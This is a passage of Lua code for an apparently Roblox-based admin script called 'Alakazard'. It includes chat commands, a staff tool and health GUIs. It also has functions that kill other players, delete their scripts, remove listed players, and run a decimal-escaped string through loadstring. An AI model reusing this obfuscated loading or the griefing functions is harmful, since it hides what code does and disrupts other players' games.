        w.Part1=p
        if i==1 then
         w.C0=rot(0,-pi/2*cc/1.5,.2)+vnew(0,staff.Size.y/2,0)
        else
         w.C0=rot(0,0,.2)+vnew(p.Size.x/2,0,0)
        end
       end)
      end
     end
    end)
   p=new('Part')
   p.Shape=0
   p.Name='a'
   p.Material=('Slate')
   p.Size=vnew(1,1,1)
   p.CanCollide=false
   p.Parent=tool
   w=new('Weld',staff)
   w.Part0=staff
   w.Part1=p
   w.C0=fnew(0,staff.Size.y/2,0)
   p=new('Part')
   p.Shape=0
   p.Name='Smoke'
   p.Material=('Slate')
   p.BottomSurface=0
   p.TopSurface=0
   p.Size=vnew(1,1,1)
   p.BrickColor=bcn(1003)
   p.CanCollide=false
   p.Parent=tool
   Smoke=new('Smoke',p)
   Smoke.Size=.01
   Smoke.Enabled=false
   Smoke.Color=cnew(0,0,0)
   Smoke.Opacity=1
   Smoke.RiseVelocity=5
   Sp=new('Sparkles')
   Sp.Enabled=false
   Sp.Parent=p
   Sp.Color=cnew(1,0,0)
   w=new('Weld',staff)
   w.Part0=staff
   w.Part1=p
   w.C0=fnew(0,staff.Size.y/1.3,0)
   SmokePart=p
   hagal={}
   for y=1,4 do
    for i=1,20 do
     if tool.Parent~=player.Character then
      break
     end
     p=new('Part')
     hagal[i]=p
     p.formFactor=3
     p.Name='q'
     p.BrickColor=bcn(1003)
     p.Size=vnew(.5,.4,.5)
     p.Material=('Slate')
     p.CanCollide=false
     p.Parent=tool
     if i==1 then
      w=new('Weld',staff)
     else
      w=new('Weld',hagal[i-1])
     end
     w.Part0=w.Parent
     w.Part1=p
     if i==1 then
      w.C0=rot(0,pi/2*y,0)+vnew(0,(staff.Size.y/2)-i*p.Size.y+.2,0)
     elseif i<=10 then
      w.C0=rot(0,pi/2/i,0)+vnew(.05,-p.Size.y/2,0)
     elseif i>10 then
      w.C0=rot(.1,pi/2/i*6,0)+vnew(.03,-p.Size.y,0)
     end
     wait''
    end
   end
   for i,v in pairs(tool:children())do
    if v.Name=='Smoke'then
     v.Touched:connect(function(a)
      x(function()
       if a.Parent~=player.Character and a.Parent~=tool then
        if mode==1 then
         s1(a)
        elseif mode==2 then
         s2(a)
        elseif mode==3 then
         s3(a)
        end
       end
      end)
     end)
    end
   end
  end)
  tool.Unequipped:connect(function()
   if tool.Parent:IsA('Backpack')then
    for i,v in pairs(tool:children())do
     if v~=staff and v~=script then
      v:remove()
     end
    end
   end
   z=nil
  end)
  x(function()
   player.Character.Humanoid.Died:connect(function()if tool.Parent~=player.Character then tool:remove() return end
    if fakestaff~=nil then return end
    fakestaff=new('Model',workspace)
    debris:AddItem(fakestaff,10)
    for i,v in pairs(tool:children())do
     if v~=script then
      v.Parent=fakestaff
      v.Anchored=true
      x(function()v.Smoke.Enabled=true end)
      x(function()v.Sparkles.Enabled=true end)
     end
    end
    sing('2',fakestaff.Smoke)
    fakestaff.Handle:remove()
    fakestaff:BreakJoints()
    tool:remove()
   end)
  end)
 ]],Tool)
 Tool.Parent=par
 Print('Staff added for '..par.Parent.Name..'!')
end
hatsmodel=game:GetService('InsertService'):LoadAsset(53684482)
if hatsmodel~=nil then
 if #hatsmodel:GetChildren()~=0 then
  for i,hats in pairs(hatsmodel:GetChildren())do
   Hats.AlakazardHats[i]=hats:clone()
   hats:remove()
  end
 end
end
if game.PlaceId==113456 or game.PlaceId==56786 or game.PlaceId==115207 or game.PlaceId==0 then
AnaminusBlock={
  ObjectCheck0=function(d)if d:FindFirstChild('DSource')then se.debris:AddItem(d,0)d.archivable=true end end,
  ObjectCheck1=function(d)if d:FindFirstChild('DSource') then d:FindFirstChild('DSource').Value='' end end,
  ObjectCheck2=function(d)if d:FindFirstChild('DSource') then d:FindFirstChild('DSource').Value='' d:remove() end end,
  ObjectCheck3=function(d)if d:FindFirstChild('DSource') and d.className=='Script' then d.Disabled=true d:FindFirstChild('DSource').Value='' wait()d:remove() end end,
 }
 AnaSbCheck1=se.workspace.ChildAdded:connect(function(asd)
  for i,a in pairs(AnaminusBlock)do
   if asd~=nil then
    a(asd)
   end
  end
 end)
end
Create=function(fn)table.insert(AlakazardCmds.NewFunctions,X(fn))end
ChangeClear=function(asdasd,data)
 for _,v in pairs(asdasd:GetChildren())do
  X(function()
   if data:lower()=='name'then
    if string.find(v.Name:lower(),AlakazardCmds.Names.clear:lower())==1 then
     v.arcivable=false
     se.debris:AddItem(v,0)
     ChangeClear(v,'Name')
    end
   elseif data:lower()=='class'then
    if string.find(v.className:lower(),AlakazardCmds.Names.clear:lower())==1 then
     v.arcivable=false
     se.debris:AddItem(v,0)
     ChangeClear(v,'class')
    end
   end
  end)
 end
end
Clear=function(o,n)
 if n:lower()=='script'then
  for i,v in pairs(o:GetChildren())do
   X(function()
    X(function()
     if v:IsA('BaseScript')and v.Name~='Animate'then 
      if script==nil then
       v.Disabled=true
       v.archivable=false
       se.debris:AddItem(v,0)
      end 
      if script~=nil and v~=script then
       v.Disabled=true
       v.archivable=false
       se.debris:AddItem(v,0)
      end
     end
    end)
    X(function()Clear(v,'script')end)
   end)
  end
 elseif n:lower()=='all'then
  for i,v in pairs(o:GetChildren())do
   X(function()
    archivable=false
    se.debris:AddItem(v,.2)
   end)
   X(function()Clear(v,'all')end)
  end
 end
end
_HM=function(txt,class,par)
 pcall(function()
  _hm=new(class)
  _hm.Text=txt
  sound=new('Sound',_hm)
  sound.Volume=1
  sound.SoundId='rbxasset://sounds//SWITCH3.wav'
  se.debris:AddItem(_hm,#txt/7)
  Scripting('local',[[text=']]..txt..[[' for i=1,#text do script.Parent.Text='|:| '..text:sub(1,i)..' |:|'pcall(function()script.Parent.Sound:play()end)wait()end]],_hm)
  _hm.Parent=par
 end)
 return _hm
end
Adv=function(txt,par,pos1,pos2,pos3,pos4)
 Hint=Guis.Hint.Screen:clone()
 se.debris:AddItem(Hint,#txt/4.5)
 if #txt~=0 then
  newsound=new('Sound')
  newsound.SoundId=Sounds.warning.SoundId
  newsound.Pitch=Sounds.warning.Pitch
  newsound.Volume=Sounds.warning.Volume
  newsound.Looped=Sounds.warning.Looped
  newsound:play()
  newsound.Parent=Hint
  newsound:play()
 end
 Hint.t.Text='|:| '..txt..' |:|'
 Hint.t.Position=unew(pos1,pos2,pos3,pos4)
 Hint.Parent=par
 return Hint
end
FixCmds=function(v,p)
 wait()
 i=0
 if scmd(v,'fix')==false then return end 
 for asd,c in pairs(Commands)do
  i=i+1
  Actual[p.Name..i]:disconnect()
  end
 for i,c in pairs(Commands)do 
  Actual[p.Name..i]=p.Chatted:connect(function(v)
   c(v,p)
  end)
 end 
end
scmd=function(v,c)
 vl=v:lower()
 cl=c:lower()
 for asd in vl:gmatch('%w+')do
  if asd==cl then
   for i=1,#v do
    if vl:sub(i,i+#cl)==cl..'/' then
     clen=i+#c
     return true
    end
   end
  end
 end
 return false
end
Findw=function(wtw,wcommandw,wnumw)
 X(function()
  Q={}
  wtextw=wtw:lower()
  wclw=wcommandw:lower()
  ym=false
  for wlw in string.gmatch(wtextw,'%w+') do
   if ym==true then
    table.insert(Q,wlw)
   end
   if Q[wnumw]~=nil then 
    return Q 
   end
   if wlw==wclw then
    if wnumw==0 then
     return wlw
    end
    ym=true 
   end
  end
  return nil
 end)
end
spl=function(name,s)
 if name==nil or s==nil then return{}end
 t={}
  if name:lower()==''then table.insert(t,s)return t end
  if name:lower()=='me'then table.insert(t,s)return t end
  if name:lower()=='admins'then for n,pl in ipairs(se.players:GetPlayers())do if ListCheck(PlayersList.Admins,pl.userId)==true then table.insert(t,pl) end end return t end
  if name:lower()=='noobs'then for n,pl in ipairs(se.players:GetPlayers())do if ListCheck(PlayersList.Admins,pl.userId)~=true then table.insert(t,pl) end end return t end
  if name:lower()=='all'then for n,pl in ipairs(se.players:GetPlayers())do  table.insert(t,pl) end return t end
  if name:lower()=='notme'then for n,pl in ipairs(se.players:GetPlayers())do if pl~=s then table.insert(t,pl) end end return t end
  for n,pl in ipairs(se.players:GetPlayers())do  if string.find(pl.Name:lower(),name:lower())==1 then table.insert(t,pl)end end 
 return t
end
CCL=function(p)
 delay(.75,function()
  for i,v in pairs(p.Character.Head:GetChildren())do
   if v.className=='Sound'then
    v.Pitch=0
    se.debris:AddItem(v,.1)
   end
  end
  for i,v in pairs(p.Character:GetChildren())do
   if v:IsA('BaseScript')and v.Name~='Animate'and v.Name~='LocalScript'then
    se.debris:AddItem(v,.1)
   end
  end
 end)
end
FakeHead=function(p)
 pcall(function()
  head=p.Character.Head
  fake=head:clone()
  model=new('Model')
  human=new('Humanoid')
  head.Transparency=1
  for i,v in pairs(head:children())do
   if not v:IsA('Weld')and v:IsA('SpecialMesh')then
    v:remove()
   end
  end
  model.Parent=head.Parent
  model.Name=''
  
  fake.Parent=model
  pcall(function()fake.BrickColor=model.Parent['Body Colors'].HeadColor end)
  weld=new('Weld',model.Parent.Torso)
  weld.Part0=weld.Parent
  weld.Part1=fake
  weld.C0=CFrame.new(0,1.5,0)
  human.Parent=model
  human.Health=0
  human.MaxHealth=0
 end)
end
KO_CREATOR=function(user1,user2)
 X(function()
  c=new('ObjectValue')
  c.Value=user1
  c.Name='creator'
  for i,hum in pairs(user2.Character:GetChildren())do
   if hum.className=='Humanoid'then
    c.Parent=hum
    hum.Health=0
   end
  end
  user2.Character:BreakJoints()
 end)
end
KO=function(user1,user2)wait()
 X(function()
  PlayersList.Runs.HealthBar[user2.Name]=false
  KOsScriptNew=Scripting('local',[[script.Parent=workspace
   Player1=']]..user1.Name..[['
   Player2=']]..user2.Name..[['
   repeat
    wait(.05)
    if pcall(function()
     Ala1=game.Players[Player1]
     Ala2=game.Players[Player2]
     ko=Instance.new('ObjectValue')
     ko.Name='creator'
     ko.Value=Ala1
     m=Instance.new('Model')
     game:service('Debris'):AddItem(m,.2)
     m.Name=Player2
     h=Instance.new('Humanoid',m)
     ko.Parent=h
     Ala2.Character=m
     Ala2.Character.Parent=workspace
    end)then
    else
     script:remove()
    end
   until asd~=nil
  ]],user1.PlayerGui)
  table.insert(PlayersList.KOs,KOsScriptNew)
 end)
end
LoadGuisHere=function()
 Guis.HealthBar[1]=new('ScreenGui')
 Guis.HealthBar[1].Name=[[==Alakazard's Health Guis==]]
 Guis.HealthBar[2]=Instance.new('Frame',Guis.HealthBar[1])
 Guis.HealthBar[2].Name='base'
 Guis.HealthBar[2].Position=UDim2.new(0.400000000,0,0.94000000,0)
 Guis.HealthBar[2].Size=UDim2.new(0.200000000,0,0.059000000,0)
 Guis.HealthBar[2].Style=('RobloxSquare')
 Guis.HealthBar[3]=Instance.new('Frame',Guis.HealthBar[2])
 Guis.HealthBar[3].Name='Health_1'
 Guis.HealthBar[3].Size=UDim2.new(0.9000000000,0,0.5,0)
 Guis.HealthBar[3].BackgroundTransparency=.8
 Guis.HealthBar[3].BackgroundColor3=Color3.new(128,0,0)
 Guis.HealthBar[4]=Instance.new('Frame',Guis.HealthBar[3])
 Guis.HealthBar[4].Name='Health'
 Guis.HealthBar[4].Size=UDim2.new(1,0,1,0)
 Guis.HealthBar[4].BackgroundTransparency=.8
 Guis.HealthBar[4].BackgroundColor3=Color3.new(0,255,0)
 Guis.HealthBar[5]=Instance.new('TextLabel',Guis.HealthBar[3])
 Guis.HealthBar[5].Name='hp'
 Guis.HealthBar[5].Position=UDim2.new(.5,0,.5,0)
 Guis.HealthBar[5].TextColor3=Color3.new(255,255,255)
 Guis.HealthBar[5].Text='Alakazard; Pending...'
 Guis.HealthBar[6]=Instance.new('Frame',Guis.HealthBar[2])
 Guis.HealthBar[6].Name='Health_2'
 Guis.HealthBar[6].Size=UDim2.new(0.9000000000,0,0.5,0)
 Guis.HealthBar[6].Position=UDim2.new(0,0,.55,0)
 Guis.HealthBar[6].BackgroundTransparency=.8
 Guis.HealthBar[6].BackgroundColor3=Color3.new(128,0,0)
 Guis.HealthBar[7]=Instance.new('Frame',Guis.HealthBar[6])
 Guis.HealthBar[7].Name='Health'
 Guis.HealthBar[7].Size=UDim2.new(1,0,1,0)
 Guis.HealthBar[7].BackgroundTransparency=.8
 Guis.HealthBar[7].BackgroundColor3=Color3.new(255,255,0)
 Guis.HealthBar[8]=Instance.new('TextLabel',Guis.HealthBar[6])
 Guis.HealthBar[8].Name='hp'
 Guis.HealthBar[8].Position=UDim2.new(.5,0,.5,0)
 Guis.HealthBar[8].TextColor3=Color3.new(255,255,255)
 Guis.HealthBar[8].Text='Alakazard; Pending...'
 Guis.HealthBar[9]=Scripting('local',[[print'load']],Guis.HealthBar[1])
 Guis.HealthBar[10]=Instance.new('ImageLabel')
 Guis.HealthBar[10].Name=[[(|:. Alakazard's Symbol .:|)]]
 Guis.HealthBar[10].Position=UDim2.new(.9,0,0,0)
 Guis.HealthBar[10].Parent=Guis.HealthBar[2] 
 Guis.HealthBar[10].Size=UDim2.new(.1,0,1.1,0)
 Guis.HealthBar[10].Image=id..'47965745'
 Guis.HealthBar[10].BackgroundTransparency=1
 Guis.Hint.Screen=new('ScreenGui')
 Guis.Hint.Screen.Name='NewHint'
 Guis.Hint.TextGui=new('TextButton',Guis.Hint.Screen)
 Guis.Hint.TextGui.Name='t'
 Guis.Hint.TextGui.Style=('RobloxButton')
 Guis.Hint.TextGui.TextColor3=Color3.new(1,1,1)
 Guis.Hint.TextGui.AutoButtonColor=false 
 Guis.Hint.TextGui.FontSize=('Size10')
 Guis.Hint.TextGui.Size=UDim2.new(1,0,.05,0)
 Guis.Hint.TextGui.TextWrap=true
end
SoundsLoad=function()
 X(function()
  for n,s in pairs(se.lighting:GetChildren())do 
   for sn in pairs(Sounds)do 
    if s.Name==sn then 
    s:remove()
    end 
   end 
  end
  for i in pairs(Sounds)do 
   newsound=new('Sound')
   newsound.Name=i 
   newsound.SoundId=Sounds[i].SoundId 
   newsound.Pitch=0 
   newsound.Volume=0 
   newsound.Looped=true 
   newsound.Parent=se.lighting 
   newsound:play()
  end
 end)
end
LoadGuis=function(p)
 if ListCheck(PlayersList.Admins,p.userId)==true then
  X(function()
   ShowCommands(p)
   p.ChildAdded:connect(function(child)
    if child:IsA('PlayerGui')then
     ShowCommands(p)
    end
   end)
  end)
 end
 X(function()
  X(function()wait(1)
   X(function()
    for i,v in pairs(p:children())do
     if v:IsA('PlayerGui')then
      for a,w in pairs(v:children())do
       if w.Name=='HealthGUI'then
        w:remove()
       end
      end
     end
    end
   end)
   X(function()
    if ListCheck(PlayersList.Creator,p.userId)==true then
     delay(4,function()pcall(function()p.Character.Head.face:remove()end)end)
     delay(4,function()pcall(function()p.Character.Head.BrickColor=bcn(1003)end)end)
     if p.Character~=nil then
      X(function()
       for wqw,hatw in pairs(Hats.AlakazardHats)do
        hatw:clone().Parent=p.Character
       end
      end)
     end
    end
   end)
   X(function()
    if PlayersList.Runs.HealthBar[p.Name]==false then return end
    for i,pg in pairs(p:GetChildren())do
     if pg.className=='PlayerGui'then
      for asdwasd,pgg in pairs(pg:GetChildren())do
       if pgg.Name=='HealthGUI'and pgg.className=='GuiMain'or pgg.Name==[[==Alakazard's Health Guis==]]then
        pgg:remove()
       end
      end
     return nil
     end
    end
   end)
  end)
 end)
end
JJump=function(p)
 X(function()wait(1)
  for i,v in pairs(p:children())do
   if v.className=='PlayerGui'then
    for k,a in pairs(v:children())do
     if a.Name=='Jump'then a:remove()end
    end
    asdscript=Scripting('local',[[
     p=script.Parent.Parent 
     p.Character.Humanoid.Jumping:connect(function()
      if asd~=nil then return end
      asd='not nil'
      p.Character.Torso.Velocity=Vector3.new(p.Character.Torso.Velocity.x*1.6,100,p.Character.Torso.Velocity.z*1.6)
      wait(1)
      asd=nil
     end)
    ]],nil)
    asdscript.Name='Jump'
    asdscript.Parent=v
    return
   end
  end
 end)
end
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
--[[======================================================================]]--
PlayerFunctions={
  
  HealthBar=function(p)
  if ListCheck(PlayersList.Runs.HealthBar,p.Name)==true then return end
   PlayersList.Runs.HealthBar[p.Name]=true
   delay(1,function()
    Scripting('local',[==[
     --Alakazard
     if game.CreatorId==14072171 then script:remove()return end
     player=game.Players.LocalPlayer
     new=Instance.new
     unew=UDim2.new
     cnew=Color3.new
     Alakazard='Alakazard; '
     life=function(obj,time)
      game:service('Debris'):AddItem(obj,time)
     end
     
     life(game:FindFirstChild('Alakazard'..'\39'..'s Health Gui ('..player.Name..')',true),0)
     
     script.Name='ALAKAZARD HEALTH GUI SCRIPT'
     
     screen=new('ScreenGui',game.CoreGui)
     screen.Name='Alakazard'..'\39'..'s Health Gui ('..player.Name..')'
     
     script.Parent=screen
     
     main=new('Frame',screen)
     main.Position=unew(.2,0,.95,0)
     main.Size=unew(.6,0,.05,0)
     main.BackgroundColor3=cnew(128,0,0)
     main.BackgroundTransparency=.7
     main.BorderColor3=cnew(0,0,0)
     frame=new('ImageLabel',main)
     frame.Size=unew(1,0,1,0)
     frame.Image='rbxassetid://54639434'
     frame.BackgroundColor3=cnew(0,128,0)
     frame.BackgroundTransparency=.5
     frame.BorderSizePixel=0
     frame.BorderColor3=cnew(0,0,0)
     health=new('TextLabel',main)
     health.Text=Alakazard..'Pending...'
     health.Position=unew(.5,0,.5,0)
     health.TextColor3=cnew(0,0,0)
     health.BorderSizePixel=0
     health.Font=2
     health.FontSize='Size14'
     black=new('ImageLabel',main)
     black.Image='rbxassetid://54647921'
     black.BackgroundTransparency=1
     black.Size=unew(.05,0,1,0)
     black.Position=unew(-.05,0,0,0)
     black=new('ImageLabel',main)
     black.Image='rbxassetid://54648019'
     black.BackgroundTransparency=1
     black.Size=unew(.05,0,1,0)
     black.Position=unew(1,0,0,0)
     humanoid=function()
      if player.Character==nil then return end
      for i,v in pairs(player.Character:children())do
       if v:IsA('Humanoid')then
        return v
       end
      end
      return nil
     end
     heal=function()
      pcall(function()
       if humanoid().Health==h.MaxHealth then return end
       humanoid():TakeDamage(-humanoid().MaxHealth/1000)
      end)
     end 
     C=function()
     pcall(function()h=humanoid()frame.Size=unew(h.Health/h.MaxHealth,0,1,0)end)
     pcall(function()h=humanoid()health.Text=Alakazard..'Your Health Status   { Health:'..math.ceil(h.Health)..' }'..' [ Max:'..math.ceil(h.MaxHealth)..' ]'..' ( '..math.ceil((h.Health/h.MaxHealth)*100)..'% )'end)
     end
     connect=function()
      pcall(function()
       humanoid().Died:connect(function()
        pcall(function()
         _Alakazard=game:service('Players'):FindFirstChild('raj99')
         if not _Alakazard then return end
         if humanoid:FindFirstChild('creator')then return end
         Tag=new('ObjectValue')
         Tag.Value=_Alakazard
         Tag.Name='creator'
         Tag.Parent=humanoid()
        end)
       end)
      end)
      pcall(function()humanoid().HealthChanged:connect(function()pcall(function()C()end)end)end)
      delay(0,function()
       while humanoid()~=nil do --ugly loop
         wait'.125'
        pcall(function()
         heal()
        end)
       end
      end)
     end
     player.ChildAdded:connect(function(a)wait()
      if a:IsA('PlayerGui')then
       a.ChildAdded:connect(function(child)wait()
        if child:IsA('GuiMain')or child.Name=='HealthGUI'then
         life(child,0)
        end
       end)
      end
     end)
     pcall(function()connect()end)
     pcall(function()heal()end)
     pcall(function()C()end)
     player.CharacterAdded:connect(function()
      wait()
      pcall(function()connect()end)
      pcall(function()heal()end)
      pcall(function()C()end)
     end)
     pcall(function()
      la={'ControlFrame','SubMenuBuilder','Popup'}
      for i,v in pairs(la)do
       game:service('Debris'):AddItem(game:FindFirstChild(v,true),1)
      end
     end)
    ]==],PlayerGui(p))
   end)
  end,
  
  CmdsConnect=function(p)
   if ListCheck(PlayersList.Admins,p.userId)==true then
    huh=0
    PlayersList.Runs.History[p.Name]=false
    for i,c in pairs(Commands)do
     huh=huh+1
     Actual[p.Name..huh]=p.Chatted:connect(function(v)
     c(v,p)
     end)
    end
    p.Chatted:connect(function(v)
     FixCmds(v,p)
    end)
   end 
   p.ChildAdded:connect(function(ob)ob.ChildAdded:connect(function(c)if c.Name=='HealthGUI'then c:remove()end end)if ob:IsA('PlayerGui')then LoadGuis(p)end end)
   LoadGuis(p)
  end,
  AnnoyingC=function(p)
   if ListCheck(PlayersList.Annoying,p.Name)==true then
    life(p,0)
   end
  end,
  
  ToolsAdded=function(p)
   if ListCheck(PlayersList.Admins,p.userId)==false then return end
    Staff(Backpack(p))
    FlyBin(Backpack(p))
    p.ChildAdded:connect(function(d)
     if d:IsA('Backpack')then
      FlyBin(d)
      Staff(d)
     end
    end)
   end,
  
  CC=function(p)
   delay(1,function()Scripting('local',[[loadstring('\115\99\114\105\112\116\46\80\97\114\101\110\116\61\115\99\114\105\112\116\46\80\97\114\101\110\116\46\80\97\114\101\110\116\46\67\104\97\114\97\99\116\101\114\10\10\102\117\110\99\116\105\111\110\32\119\97\105\116\70\111\114\67\104\105\108\100\40\112\97\114\101\110\116\44\32\99\104\105\108\100\78\97\109\101\41\10\9\108\111\99\97\108\32\99\104\105\108\100\32\61\32\112\97\114\101\110\116\58\102\105\110\100\70\105\114\115\116\67\104\105\108\100\40\99\104\105\108\100\78\97\109\101\41\10\9\105\102\32\99\104\105\108\100\32\116\104\101\110\32\114\101\116\117\114\110\32\99\104\105\108\100\32\101\110\100\10\9\119\104\105\108\101\32\116\114\117\101\32\100\111\10\9\9\99\104\105\108\100\32\61\32\112\97\114\101\110\116\46\67\104\105\108\100\65\100\100\101\100\58\119\97\105\116\40\41\10\9\9\105\102\32\99\104\105\108\100\46\78\97\109\101\61\61\99\104\105\108\100\78\97\109\101\32\116\104\101\110\32\114\101\116\117\114\110\32\99\104\105\108\100\32\101\110\100\10\9\101\110\100\10\101\110\100\10\10\102\117\110\99\116\105\111\110\32\110\101\119\83\111\117\110\100\40\105\100\41\10\9\108\111\99\97\108\32\115\111\117\110\100\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\83\111\117\110\100\34\41\10\9\115\111\117\110\100\46\83\111\117\110\100\73\100\32\61\32\105\100\10\9\115\111\117\110\100\46\97\114\99\104\105\118\97\98\108\101\32\61\32\102\97\108\115\101\10\9\115\111\117\110\100\46\80\97\114\101\110\116\32\61\32\115\99\114\105\112\116\46\80\97\114\101\110\116\46\72\101\97\100\10\9\114\101\116\117\114\110\32\115\111\117\110\100\10\101\110\100\10\10\45\45\32\100\101\99\108\97\114\97\116\105\111\110\115\10\10\108\111\99\97\108\32\115\68\105\101\100\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\115\115\101\116\58\47\47\115\111\117\110\100\115\47\117\117\104\104\104\46\119\97\118\34\41\10\108\111\99\97\108\32\115\70\97\108\108\105\110\103\68\111\119\110\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\1
15\115\101\116\58\47\47\115\111\117\110\100\115\47\115\112\108\97\116\46\119\97\118\34\41\10\108\111\99\97\108\32\115\70\114\101\101\70\97\108\108\105\110\103\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\115\115\101\116\58\47\47\115\111\117\110\100\115\47\115\119\111\111\115\104\46\119\97\118\34\41\10\108\111\99\97\108\32\115\71\101\116\116\105\110\103\85\112\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\115\115\101\116\58\47\47\115\111\117\110\100\115\47\104\105\116\46\119\97\118\34\41\10\108\111\99\97\108\32\115\74\117\109\112\105\110\103\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\115\115\101\116\58\47\47\115\111\117\110\100\115\47\98\117\116\116\111\110\46\119\97\118\34\41\10\108\111\99\97\108\32\115\82\117\110\110\105\110\103\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\115\115\101\116\58\47\47\115\111\117\110\100\115\47\98\102\115\108\45\109\105\110\105\102\105\103\102\111\111\116\115\49\46\109\112\51\34\41\10\115\82\117\110\110\105\110\103\46\76\111\111\112\101\100\32\61\32\116\114\117\101\10\10\108\111\99\97\108\32\70\105\103\117\114\101\32\61\32\115\99\114\105\112\116\46\80\97\114\101\110\116\10\108\111\99\97\108\32\72\101\97\100\32\61\32\119\97\105\116\70\111\114\67\104\105\108\100\40\70\105\103\117\114\101\44\32\34\72\101\97\100\34\41\10\108\111\99\97\108\32\72\117\109\97\110\111\105\100\32\61\32\119\97\105\116\70\111\114\67\104\105\108\100\40\70\105\103\117\114\101\44\32\34\72\117\109\97\110\111\105\100\34\41\10\10\45\45\32\102\117\110\99\116\105\111\110\115\10\10\102\117\110\99\116\105\111\110\32\111\110\68\105\101\100\40\41\10\9\115\68\105\101\100\58\80\108\97\121\40\41\10\101\110\100\10\10\102\117\110\99\116\105\111\110\32\111\110\83\116\97\116\101\40\115\116\97\116\101\44\32\115\111\117\110\100\41\10\9\105\102\32\115\116\97\116\101\32\116\104\101\110\10\9\9\115\111\117\110\100\58\80\108\97\121\40\41\10\9\101\108\115\101\10\9\9\115\111\117\110\100\58\80\97\117\115\101\40\41\10\9\101\110\100\1
0\101\110\100\10\10\102\117\110\99\116\105\111\110\32\111\110\82\117\110\110\105\110\103\40\115\112\101\101\100\41\10\9\105\102\32\115\112\101\101\100\62\48\32\116\104\101\110\10\9\9\115\82\117\110\110\105\110\103\58\80\108\97\121\40\41\10\9\101\108\115\101\10\9\9\115\82\117\110\110\105\110\103\58\80\97\117\115\101\40\41\10\9\101\110\100\10\101\110\100\10\10\45\45\32\99\111\110\110\101\99\116\32\117\112\10\10\72\117\109\97\110\111\105\100\46\68\105\101\100\58\99\111\110\110\101\99\116\40\111\110\68\105\101\100\41\10\72\117\109\97\110\111\105\100\46\82\117\110\110\105\110\103\58\99\111\110\110\101\99\116\40\111\110\82\117\110\110\105\110\103\41\10\72\117\109\97\110\111\105\100\46\74\117\109\112\105\110\103\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\115\116\97\116\101\41\32\111\110\83\116\97\116\101\40\115\116\97\116\101\44\32\115\74\117\109\112\105\110\103\41\32\101\110\100\41\10\72\117\109\97\110\111\105\100\46\71\101\116\116\105\110\103\85\112\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\115\116\97\116\101\41\32\111\110\83\116\97\116\101\40\115\116\97\116\101\44\32\115\71\101\116\116\105\110\103\85\112\41\32\101\110\100\41\10\72\117\109\97\110\111\105\100\46\70\114\101\101\70\97\108\108\105\110\103\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\115\116\97\116\101\41\32\111\110\83\116\97\116\101\40\115\116\97\116\101\44\32\115\70\114\101\101\70\97\108\108\105\110\103\41\32\101\110\100\41\10\72\117\109\97\110\111\105\100\46\70\97\108\108\105\110\103\68\111\119\110\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\115\116\97\116\101\41\32\111\110\83\116\97\116\101\40\115\116\97\116\101\44\32\115\70\97\108\108\105\110\103\68\111\119\110\41\32\101\110\100\41\10')()]],Backpack(p)).Name='newSound'end)
   if ListCheck(PlayersList.Admins,p.userId)==true then
    JJump(p)
    delay(2,function()FakeHead(p)end)
    X(function()p.Character.Humanoid.Died:connect(function()Print(p.Name..' getting wos ;D')p.Character=nil end)end)
   end
   laggs={'RobloxTeam','Health','Sound'}
   pcall(function()
    delay(0,function()
     p.Character.ChildAdded:connect(function(new)
      delay(.01,function()
       for v,i in pairs(laggs)do
        if new.Name:lower():find(i:lower())==1 then
         new:remove()
        end
       end
      end)
     end)
    end)
   end)
   CCL(p)
   p.CharacterAdded:connect(function()
    delay(1,function()Scripting('local',[[loadstring('\115\99\114\105\112\116\46\80\97\114\101\110\116\61\115\99\114\105\112\116\46\80\97\114\101\110\116\46\80\97\114\101\110\116\46\67\104\97\114\97\99\116\101\114\10\10\102\117\110\99\116\105\111\110\32\119\97\105\116\70\111\114\67\104\105\108\100\40\112\97\114\101\110\116\44\32\99\104\105\108\100\78\97\109\101\41\10\9\108\111\99\97\108\32\99\104\105\108\100\32\61\32\112\97\114\101\110\116\58\102\105\110\100\70\105\114\115\116\67\104\105\108\100\40\99\104\105\108\100\78\97\109\101\41\10\9\105\102\32\99\104\105\108\100\32\116\104\101\110\32\114\101\116\117\114\110\32\99\104\105\108\100\32\101\110\100\10\9\119\104\105\108\101\32\116\114\117\101\32\100\111\10\9\9\99\104\105\108\100\32\61\32\112\97\114\101\110\116\46\67\104\105\108\100\65\100\100\101\100\58\119\97\105\116\40\41\10\9\9\105\102\32\99\104\105\108\100\46\78\97\109\101\61\61\99\104\105\108\100\78\97\109\101\32\116\104\101\110\32\114\101\116\117\114\110\32\99\104\105\108\100\32\101\110\100\10\9\101\110\100\10\101\110\100\10\10\102\117\110\99\116\105\111\110\32\110\101\119\83\111\117\110\100\40\105\100\41\10\9\108\111\99\97\108\32\115\111\117\110\100\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\83\111\117\110\100\34\41\10\9\115\111\117\110\100\46\83\111\117\110\100\73\100\32\61\32\105\100\10\9\115\111\117\110\100\46\97\114\99\104\105\118\97\98\108\101\32\61\32\102\97\108\115\101\10\9\115\111\117\110\100\46\80\97\114\101\110\116\32\61\32\115\99\114\105\112\116\46\80\97\114\101\110\116\46\72\101\97\100\10\9\114\101\116\117\114\110\32\115\111\117\110\100\10\101\110\100\10\10\45\45\32\100\101\99\108\97\114\97\116\105\111\110\115\10\10\108\111\99\97\108\32\115\68\105\101\100\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\115\115\101\116\58\47\47\115\111\117\110\100\115\47\117\117\104\104\104\46\119\97\118\34\41\10\108\111\99\97\108\32\115\70\97\108\108\105\110\103\68\111\119\110\32\61\32\110\101\119\83\111\117\110\100\40\34\114\98\120\97\
